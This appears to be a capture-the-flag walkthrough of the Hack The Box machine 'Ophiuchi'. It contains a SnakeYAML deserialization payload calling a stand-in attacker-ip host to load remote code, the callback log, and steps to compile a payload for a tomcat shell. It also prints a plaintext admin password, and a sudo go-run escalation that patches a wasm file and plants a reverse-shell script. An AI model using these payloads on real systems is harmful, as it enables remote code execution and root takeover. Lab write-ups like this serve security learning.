# Ophiuchi

## Enumeration

nmap port is 8080 open 
containing a yaml parser
Firstly I used a python object which resulted into an error 
then I found it is running in java
Searched for java yaml exploit and found an awesome article
https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858

## Exploit

Running a simple code 

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```
gave us the ping 

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.77.30 - - [14/Feb/2021 10:15:44] code 404, message File not found
10.129.77.30 - - [14/Feb/2021 10:15:44] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 404 -
```

So the webapp is expecting a /META-INF/services/javax.script.ScriptEngineFactory file which would contain our final exploit

Cloned this repo
https://github.com/artsploit/yaml-payload

We need to run our server in this dir: `~/hackthebox/boxes/ophiuchi/yaml-payload/src$`

Server was throwing error status 500
```
java.lang.UnsupportedClassVersionError: artsploit/AwesomeScriptEngineFactory has been compiled by a more recent version of the Java Runtime (class file version 59.0), this version of the Java Runtime only recognizes class file versions up to 55.0
```

To fix this we need to compile our program with lower versions of java

to check the class file version
```
javap -v AwesomeScriptEngineFactory.class | grep "major"
```

to compile
```
javac --release 8 AwesomeScriptEngineFactory.java
```

Run the python server `~/hackthebox/boxes/ophiuchi/yaml-payload/src$`

and we got shell as tomcat

## User
linpeas could help
found password in /opt/tomcat/conf/tomcat-users.xml

```
admin:whythereisalimit
```

## root

sudo -l
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go


I downloaded the main.wasm file to analyze it
https://webassembly.github.io/wabt/demo/wasm2wat/index.html

```

(module
  (type $t0 (func (result i32)))
  (func $info (export "info") (type $t0) (result i32)
    (i32.const 0)) #need to make it 1
  (table $T0 1 1 funcref)
  (memory $memory (export "memory") 16)
  (global $g0 (mut i32) (i32.const 1048576))
  (global $__data_end (export "__data_end") i32 (i32.const 1048576))
  (global $__heap_base (export "__heap_base") i32 (i32.const 1048576)))
```

the index.go file on the victim machine is checking if (f != 0)
index.go
```golang

func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
               }
```

so I changed the main.wasm to 

```
(module
  (type $t0 (func (result i32)))
  (func $info (export "info") (type $t0) (result i32)
    (i32.const 1))
  (table $T0 1 1 funcref)
  (memory $memory (export "memory") 16)
  (global $g0 (mut i32) (i32.const 1048576))
  (global $__data_end (export "__data_end") i32 (i32.const 1048576))
  (global $__heap_base (export "__heap_base") i32 (i32.const 1048576)))
```
then use this website to change from text to wasm
https://webassembly.github.io/wabt/demo/wat2wasm/index.html

transfer the wasm file to any writeable directory and name it main.wasm
also create a deploy.sh file with a rev shell or anything you want then run

```
sudo -u root /usr/bin/go run /opt/wasm-functions/index.go
```